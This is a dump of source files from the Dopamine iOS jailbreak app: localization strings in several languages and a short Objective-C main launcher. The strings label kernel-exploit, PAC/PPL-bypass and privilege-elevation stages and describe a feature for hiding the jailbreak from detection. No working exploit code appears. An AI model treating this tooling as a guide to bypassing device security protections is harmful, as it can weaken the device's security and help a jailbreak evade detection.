"Alert_Tweak_Injection_Toggled_Body" = "この変更を適用するためには、userspaceを再起動する必要があります。今すぐ再起動をしてもよろしいですか？";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "今すぐ再起動";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "後で再起動";
"Alert_Remove_Jailbreak_Title" = "Jailbreak環境を削除";
"Alert_Remove_Jailbreak_Pressed_Body" = "Jailbreak環境を削除すると、jailbreak関連のファイルはすべて削除されますが、通常のアプリケーション、ファイル、データはすべて保持されます。本当に続けてもよろしいですか？この操作を元に戻すことはできません。";
"Alert_Remove_Jailbreak_Enabled_Body" = "\"Jailbreak環境を削除\"を有効にすると、次回のjailbreak実行時にjailbreak関連ファイルはすべて削除されますが、通常のアプリ、ファイル、データはすべて保持されます。本当に続けてもよろしいですか？この操作を元に戻すことはできません。";
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "キャンセル";
"Button_Continue" = "続ける";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "バンドルID \"%@\" を持つアプリケーションはDopamine用アプリケーションディレクトリ(\"%@\")内に複数存在しています。この作業を続行できません。";
"Duplicate_Apps_Error_User_App" = "バンドルID \"%@\" を持つアプリケーションはDopamine用アプリケーションディレクトリ(\"%@\")内に存在しますが、システムにも別々にインストールされています。この作業を続行できません。";
"Duplicate_Apps_Error_Icon_Cache" = "バンドルID \"%@\" を持つアプリケーションはDopamine用アプリケーションディレクトリ(\"%@\")内に存在しますが、アイコンキャッシュには別のパス(\"%@\")で登録されています。この作業を続行できません。";

// Settings Lists
"Theme" = "テーマ";
"Kernel Exploit" = "Kernel Exploit";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "ライセンス";
"Credits_Button_Source_Code" = "ソースコード";

// Logs
"Initializing Environment" = "Initializing Jailbreak Environment";
/*Initializing Protection*/
"Loading BaseBin TrustCache" = "Loading BaseBin TrustCache";
"Applying Bind Mount" = "Applying Bind Mount";
"Removing Jailbreak" = "Removing Jailbreak";
"Elevating Privileges" = "Elevating Privileges";
"Cleaning Up Exploits" = "Cleaning Up Exploits";
"Building Phys R/W Primitive" = "Building Phys R/W Primitive";
"Rebooting Userspace" = "Rebooting Userspace";
"Patchfinding" = "Patchfinding";
"Exploiting Kernel (%@)" = "Exploiting Kernel (%@)";
"Bypassing PAC (%@)" = "Bypassing PAC (%@)";
"Bypassing PPL (%@)" = "Bypassing PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "パッケージマネージャーを選択";
"Select_Package_Managers_Install_Message" = "どちらを選択するか迷った場合は、Sileoを選択してください";
"Continue" = "続ける";


```

`Application/Dopamine/kk.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Жасағандар: opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Джейлбрейк жасау";
"Log_Error" = "Сәтсіз";

// Jailbreak Button
"Button_Jailbreak_Title" = "Джейлбрейк";
"Status_Title_Jailbroken" = "Джейлбрейк орындалды";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Реттеулер";
"Menu_Restart_SpringBoard_Title" = "SpringBoard қайта іске қосу";
"Menu_Reboot_Userspace_Title" = "Userspace қайта іске қосу";
"Menu_Credits_Title" = "Алғыс";

// Updating
"Button_Update" = "Жаңарту";
"Button_Update_Available" = "Жаңа жаңарту қол жетімді";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Жаңартуды жүктеу...";
"Update_Status_Subtitle_Please_Wait" = "Файлдар жүктелгенше күтіңіз";
"Update_Status_Installing" = "Жаңартуды орнату...";
"Update_Status_Subtitle_Restart_Soon" = "Жақында құрылғы қайта іске қосылады";
"Title_Changelog" = "Нұсқалар журналы";
"Changelog_Unavailable_Text" = "Өзгерістер тізімі қол жетімді емес";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Твиктерді енгізу";
"Settings_iDownload" = "iDownload (Әзірлеуші ​​​​терминалы)";
"Settings_Verbose_Logs" = "Кеңейтілген журналдар";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Джейлбрейкті жою";
"Button_Hide_Jailbreak" = "Джейлбрейкті жасыру";
"Button_Unhide_Jailbreak" = "Джейлбрейкті жасырмау";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Джейлбрейкті жасыру\" келесі джейлбрейкке дейін джейлбрейкпен байланысты файлдарды уақытша жояды";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
/*Alert_Tweak_Injection_Toggled_Body*/
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
/*Alert_Remove_Jailbreak_Title*/
/*Alert_Remove_Jailbreak_Pressed_Body*/
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Болдырмау";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Лицензия";
"Credits_Button_Source_Code" = "Бастапқы код";

// Logs
"Initializing Environment" = "Ортаны инициализациялау";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Патчтарды іздеу";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Пакет менеджерін таңдаңыз";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";


```

`Application/Dopamine/ko.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "by opa334, ElleKit by évelyne";

// Log
"Status_Title_Jailbreaking" = "탈옥 중";
"Log_Error" = "오류";

// Jailbreak Button
"Button_Jailbreak_Title" = "탈옥";
"Status_Title_Jailbroken" = "탈옥되었습니다";
"Unsupported" = "지원되지 않음";

// Action Menu
"Menu_Settings_Title" = "설정";
"Menu_Restart_SpringBoard_Title" = "SpringBoard 재시작";
"Menu_Reboot_Userspace_Title" = "Userspace 재시작";
"Menu_Credits_Title" = "크레딧";

// Updating
"Button_Update" = "업데이트";
"Button_Update_Available" = "업데이트 가능";
"Button_Update_Environment" = "환경 업데이트";

// Update View
"Update_Status_Downloading" = "업데이트 다운로드 중...";
"Update_Status_Subtitle_Please_Wait" = "파일 다운로드가 완료될 때까지 기다려 주십시오";
"Update_Status_Installing" = "업데이트 설치 중...";
"Update_Status_Subtitle_Restart_Soon" = "잠시 후 기기가 재시작됩니다";
"Title_Changelog" = "변경 로그";
"Changelog_Unavailable_Text" = "변경 로그 없음";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "탈옥이 제거되었습니다.";
"Removed_Jailbreak_Alert_Message" = "탈옥을 성공적으로 제거했습니다. 기기를 재시작하는 것이 권장됩니다.";
"Button_Close" = "닫기";

// Error View
"Button_Share" = "공유";
"Button_Reboot" = "재시작";

// Settings Options
"Settings_Tweak_Injection" = "트윅 주입";
"Settings_iDownload" = "iDownload (개발자 셸)";
"Settings_Verbose_Logs" = "상세 로그";
"Settings_Apps_JIT" = "앱에서 JIT 사용 허용";
"Settings_Jetsam_Multiplier" = "Jetsam 메모리 한도 배수";

// Settings Buttons
"Button_Remove_Jailbreak" = "탈옥 제거";
"Button_Hide_Jailbreak" = "탈옥 숨기기";
"Button_Unhide_Jailbreak" = "탈옥 복원";
"Button_Refresh_Jailbreak_Apps" = "탈옥 앱 새로고침";
"Button_Reinstall_Package_Managers" = "패키지 매니저 재설치";
"Button_Change_Mobile_Password" = "\"mobile\" 비밀번호 변경";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"탈옥 숨기기\"는 다음 탈옥까지 일시적으로 탈옥 관련 파일을 제거합니다.";
"Hint_Hide_Jailbreak_Jailbroken" = "\"탈옥 숨기기\"는 탈옥 기능을 부분적으로 비활성화하여 탐지를 더 어렵게 만듭니다. 하지만 완벽하게 우회되지 않으며, 모든 것을 숨길 수는 없습니다.";
"Section_Jailbreak_Settings" = "탈옥 설정";
"Section_Actions" = "작업";
"Section_Customization" = "커스텀";
"Section_Exploits" = "익스플로잇";
"Jetsam_Description" = "Jetsam은 메모리 사용량이 지정된 한도를 초과하는 프로세스를 자동으로 종료하는 시스템 기능입니다. 많은 트윅이 설치된 경우 이 한도가 시작 시에 초과되어 프로세스가 계속해서 충돌할 수 있습니다. 여기에서는 메모리 한도가 적용된 모든 프로세스의 메모리 한도를 배수로 늘릴 수 있습니다. 시스템이 충돌하거나 많은 트윅 설치로 이상한 동작이 발생하면 이 설정을 높이세요. 시스템 전체의 메모리 사용량에 부정적인 영향을 주지 않도록, 시스템이 안정적으로 작동하는 가장 낮은 옵션을 선택하는 것이 좋습니다.";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Userspace 재시작이 필요합니다.";
"Alert_Tweak_Injection_Toggled_Body" = "변경 사항을 적용하려면 Userspace를 재시작해야 합니다. 지금 재시작하시겠습니까?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "지금 재시작";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "나중에";
"Alert_Remove_Jailbreak_Title" = "탈옥 제거";
"Alert_Remove_Jailbreak_Pressed_Body" = "탈옥을 제거하면 모든 탈옥 관련 파일이 삭제되지만, 일반 앱, 파일 및 데이터는 유지됩니다. 계속하시겠습니까? 이 작업은 되돌릴 수 없습니다.";
"Alert_Remove_Jailbreak_Enabled_Body" = "\"탈옥 제거\"를 활성화하면 다음 탈옥 시 모든 탈옥 관련 파일이 삭제되지만, 일반 앱, 파일 및 데이터는 유지됩니다. 계속하시겠습니까? 이 작업은 되돌릴 수 없습니다.";
"Alert_Change_Mobile_Password_Body" = "기기의 \"mobile\" 사용자 비밀번호를 설정하세요. 이 비밀번호는 sudo를 사용하여 루트 권한에 접근할 때 필요합니다. 루트 비밀번호를 설정하려면 터미널 앱에서 \"sudo passwd root\" 명령을 실행하세요.";
"Password_Placeholder" = "비밀번호";
"Repeat_Password_Placeholder" = "비밀번호 확인";
"Password_Auth_Required" = "\"mobile\"비밀번호를 변경하려면 인증이 필요합니다.";
"Button_Change" = "변경";
"Button_Cancel" = "취소";
"Button_Continue" = "계속";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Dopamine 앱 디렉터리(\"%@\")에 동일한 식별자(\"%@\")를 가진 앱이 여러 개 있습니다. 진행할 수 없습니다.";
"Duplicate_Apps_Error_User_App" = "Dopamine 앱 디렉터리(\"%@\")에 식별자 \"%@\"를 가진 앱이 있지만, 시스템에 동일한 앱이 별도로 설치되어 있습니다. 진행할 수 없습니다.";
"Duplicate_Apps_Error_Icon_Cache" = "Dopamine 앱 디렉터리(\"%@\")에 식별자 \"%@\"를 가진 앱이 있지만, 아이콘 캐시에 다른 경로(\"%@\")로 등록되어 있습니다. 진행할 수 없습니다.";

// Settings Lists
"Theme" = "테마";
"Kernel Exploit" = "커널 익스플로잇";
"PPL Bypass" = "PPL 우회";
"PAC Bypass" = "PAC 우회";
"None" = "없음";
"Recommended" = "권장됨";

// Credits
"Credits_Button_Discord" = "디스코드";
"Credits_Button_License" = "라이선스";
"Credits_Button_Source_Code" = "소스 코드";

// Logs
"Initializing Environment" = "환경 초기화 중";
"Initializing Protection" = "보호 초기화 중";
"Loading BaseBin TrustCache" = "베이스 바이너리 신뢰 캐시 로드 중";
"Applying Bind Mount" = "바인드 마운트 적용 중";
"Removing Jailbreak" = "탈옥 제거 중";
"Elevating Privileges" = "권한 상승 중";
"Cleaning Up Exploits" = "익스플로잇 정리 중";
"Building Phys R/W Primitive" = "물리적 읽기/쓰기 기능 설정 중";
"Rebooting Userspace" = "Userspace 재시작 중";
"Patchfinding" = "패치 찾는 중";
"Exploiting Kernel (%@)" = "커널 익스플로잇(%@) 실행 중";
"Bypassing PAC (%@)" = "PAC 우회 중 (%@)";
"Bypassing PPL (%@)" = "PPL 우회 중 (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "패키지 매니저 선택";
"Select_Package_Managers_Install_Message" = "어떤 것을 선택할지 모르겠다면 Sileo를 선택하세요.";
"Continue" = "계속";

```

`Application/Dopamine/main.m`:

```m
//
//  main.m
//  Dopamine
//
//  Created by Lars Fröder on 23.09.23.
//

#import <UIKit/UIKit.h>
#import "DOAppDelegate.h"

#import "DOEnvironmentManager.h"
#import <libjailbreak/info.h>
#import <libjailbreak/jbclient_xpc.h>

int main(int argc, char * argv[]) {
    if (argc >= 3) {
        if (!strcmp(argv[1], "trollstore")) {
            if (!strcmp(argv[2], "delete-bootstrap")) {
                [[DOEnvironmentManager sharedManager] deleteBootstrap];
            }
            else if (!strcmp(argv[2], "hide-jailbreak")) {
                [[DOEnvironmentManager sharedManager] setJailbreakHidden:YES];
            }
            return 0;
        }
    }
    
    if (argc >= 2) {
        // Legacy, called by Dopamine 1.x before initiating a jbupdate
        // As updating from 1.x to 2.x is unsupported, just initiate a device reboot
        if (!strcmp(argv[1], "prepare_jbupdate")) {
            [[DOEnvironmentManager sharedManager] reboot];
            return 0;
        }
    }
    
    // If systemhook isn't loaded and we are already jailbroken, we need to do the checkin ourselves
    // This can happen when the jailbreak is hidden or when tweak injection into the Dopamine app is disabled via Choicy
    jbclient_process_checkin(NULL, NULL, NULL, NULL);
    
    if ([DOEnvironmentManager sharedManager].isJailbroken) {
        setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/var/jb/sbin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/usr/bin", 1);
        setenv("TERM", "xterm-256color", 1);
    }
    
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([DOAppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}

```

`Application/Dopamine/nl.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Gemaakt door opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Aan het jailbreaken";
"Log_Error" = "Mislukt";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbreak klaar";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Instellingen";
"Menu_Restart_SpringBoard_Title" = "SpringBoard herstarten";
"Menu_Reboot_Userspace_Title" = "Userspace herstarten";
"Menu_Credits_Title" = "Credits";

// Updating
"Button_Update" = "Update";
"Button_Update_Available" = "Update beschikbaar";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Update aan het downloaden...";
"Update_Status_Subtitle_Please_Wait" = "Een ogenblik geduld tot de bestanden zijn gedownload";
"Update_Status_Installing" = "Update aan het installeren...";
"Update_Status_Subtitle_Restart_Soon" = "Het apparaat zal binnenkort worden herstart";
"Title_Changelog" = "Changelog";
"Changelog_Unavailable_Text" = "Changelog niet beschikbaar";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (Ontwikkelaar Terminal)";
"Settings_Verbose_Logs" = "Uitgebreide logs";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Jailbreak verwijderen";
"Button_Hide_Jailbreak" = "Jailbreak verbergen";
"Button_Unhide_Jailbreak" = "Jailbreak tonen";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Jailbreak verbergen\" verwijderd jailbreak-gerelateerde bestanden tot de volgende jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "Een userspace reboot is nodig om de veranderingen toe te passen. Wil je het nu doen?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Jailbreak verwijderen";
"Alert_Remove_Jailbreak_Pressed_Body" = "Het verwijderen van jailbreak zal alle jailbreak-gerelateerde bestanden verwijderen, maar alle reguliere apps, bestanden en gegevens blijven behouden. Weet u zeker dat u wilt doorgaan? U kunt deze actie niet ongedaan maken.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Annuleren";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licentie";
"Credits_Button_Source_Code" = "Broncode";

// Logs
"Initializing Environment" = "Omgeving aan het initialiseren";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Selecteer Package Manager(s)";
"Select_Package_Managers_Install_Message" = "Als u niet zeker weet welke u moet selecteren, selecteer dan Sileo";
"Continue" = "Doorgaan";


```

`Application/Dopamine/pl.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Stworzone przez: opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreakowanie";
"Log_Error" = "Niepowodzenie";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreakuj";
"Status_Title_Jailbroken" = "Jailbreak aktywny";
"Unsupported" = "Niewspierane";

// Action Menu
"Menu_Settings_Title" = "Ustawienia";
"Menu_Restart_SpringBoard_Title" = "Restartuj SpringBoard";
"Menu_Reboot_Userspace_Title" = "Restartuj Userspace";
"Menu_Credits_Title" = "Podziękowania";

// Updating
"Button_Update" = "Aktualizuj";
"Button_Update_Available" = "Dostępna aktualizacja";
"Button_Update_Environment" = "Update Environment";

// Update View
"Update_Status_Downloading" = "Pobieranie aktualizacji...";
"Update_Status_Subtitle_Please_Wait" = "Proszę czekać, aż pliki skończą się pobierać";
"Update_Status_Installing" = "Instalowanie aktualizacji...";
"Update_Status_Subtitle_Restart_Soon" = "Urządzenie wkrótce uruchomi się ponownie";
"Title_Changelog" = "Dziennik zmian";
"Changelog_Unavailable_Text" = "Dziennik zmian niedostępny";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Wstrzykiwanie tweaków";
"Settings_iDownload" = "iDownload (terminal dla deweloperów)";
"Settings_Verbose_Logs" = "Logi verbose";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Usuń jailbreak";
"Button_Hide_Jailbreak" = "Ukryj jailbreak";
"Button_Unhide_Jailbreak" = "Odkryj jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Przeinstaluj menedżery pakietów";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Ukryj jailbreak\" tymczasowo usuwa wszystkie pliki związane z jailbreakiem (aż do następnego jailbreakowania)";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Ukryj jailbreak\" częściowo wyłącza jailbreak i próbuje utrudnić jego wykrycie. Nie jest to jednak w pełni skuteczne i nie ukrywa wszystkiego.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "Aby zmiany zostały zastosowane, musisz zrestartować Userspace. Czy chcesz zrestartować urządzenie?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Usuń jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Usunięcie jailbreak spowoduje usunięcie wszystkich plików związanych z jailbreakiem, ale wszystkie zwykłe aplikacje, pliki i dane zostaną zachowane. Jesteś pewien, że chcesz kontynuować? Tej czynności nie można cofnąć.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Anuluj";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licencja";
"Credits_Button_Source_Code" = "Kod źródłowy";

// Logs
"Initializing Environment" = "Inicjowanie Środowiska";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Wybierz menedżer(y) pakietów";
"Select_Package_Managers_Install_Message" = "Jeżeli nie jesteś pewien który wybrać, wybierz Sileo";
"Continue" = "Kontynuuj";


```

`Application/Dopamine/pt-BR.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Desenvolvido por opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Executando o Jailbreak";
"Log_Error" = "Sem sucesso";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbreak concluído!";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Configurações";
"Menu_Restart_SpringBoard_Title" = "Reiniciar SpringBoard";
"Menu_Reboot_Userspace_Title" = "Reiniciar 'Userspace'";
"Menu_Credits_Title" = "Créditos";

// Updating
"Button_Update" = "Atualizar";
"Button_Update_Available" = "Atualização disponível";
"Button_Update_Environment" = "Atualizar o 'Ambiente' do Jailbreak";

// Update View
"Update_Status_Downloading" = "Baixando atualização...";
"Update_Status_Subtitle_Please_Wait" = "Aguarde o download todos os arquivos";
"Update_Status_Installing" = "Instalando atualização...";
"Update_Status_Subtitle_Restart_Soon" = "O dispostivo reiniciará em breve";
"Title_Changelog" = "Histórico de mudanças";
"Changelog_Unavailable_Text" = "Histórico de mudanças indisponível";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Injeção de Tweaks";
"Settings_iDownload" = "iDownload (Terminal de desenvolvedor)";
"Settings_Verbose_Logs" = "Logs do Verbose";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Remover o Jailbreak";
"Button_Hide_Jailbreak" = "Ocultar o Jailbreak";
"Button_Unhide_Jailbreak" = "Deixar de ocultar o Jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstalar Gerenciadores de Pacotes";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Ocultar o Jailbreak\" remove temporariamente os arquivos do Jailbreak até a próxima execução";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Ocultar o Jailbreak\" desabilita parcialmente o Jailbreak e tenta deixá-lo mais difícil de ser detectado. Entretando, não é completamente efetivo.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "Para que as mudanças sejam aplicadas, é necessário reiniciar o 'Userspace'. Reiniciar agora?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Remover o Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Remover o Jailbreak irá deletar todos arquivos do Jailbreak, porém todos aplicativos, arquivos e informações se manterão. Você tem certeza que deseja continuar? Não será possível reverter isso.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Cancelar";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licenças";
"Credits_Button_Source_Code" = "Código-Fonte";

// Logs
"Initializing Environment" = "Iniciando o Ambiente do Jailbreak";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Patchfinding";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Escolha o(s) Gerenciador(es) de Pacotes";
"Select_Package_Managers_Install_Message" = "Se estiver em dúvida, selecione o Sileo";
"Continue" = "Continuar";


```

`Application/Dopamine/ru.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Сделано opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Выполнение джейлбрейка";
"Log_Error" = "Неудачно";

// Jailbreak Button
"Button_Jailbreak_Title" = "Джейлбрейк";
"Status_Title_Jailbroken" = "Джейлбрейк выполнен";
"Unsupported" = "Не поддерживается";

// Action Menu
"Menu_Settings_Title" = "Настройки";
"Menu_Restart_SpringBoard_Title" = "Перезапустить SpringBoard";
"Menu_Reboot_Userspace_Title" = "Перезагрузить Userspace";
"Menu_Credits_Title" = "Благодарности";

// Updating
"Button_Update" = "Обновить";
"Button_Update_Available" = "Доступно обновление";
"Button_Update_Environment" = "Обновить переменную среду";

// Update View
"Update_Status_Downloading" = "Загрузка обновления...";
"Update_Status_Subtitle_Please_Wait" = "Пожалуйста подождите, пока файлы будут загружены";
"Update_Status_Installing" = "Установка обновления...";
"Update_Status_Subtitle_Restart_Soon" = "Устройство скоро перезагрузится";
"Title_Changelog" = "Список изменений";
"Changelog_Unavailable_Text" = "Список изменений недоступен";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Джейлбрейк удалён";
"Removed_Jailbreak_Alert_Message" = "Джейлбрейк успешно удален. Рекомендуется перезагрузить устройство.";
"Button_Close" = "Закрыть";

// Error View
"Button_Share" = "Поделиться";
"Button_Reboot" = "Перезагрузить";

// Settings Toggles
"Settings_Tweak_Injection" = "Внедрение твиков";
"Settings_iDownload" = "iDownload (Терминал разработчика)";
"Settings_Verbose_Logs" = "Расширенные логи";
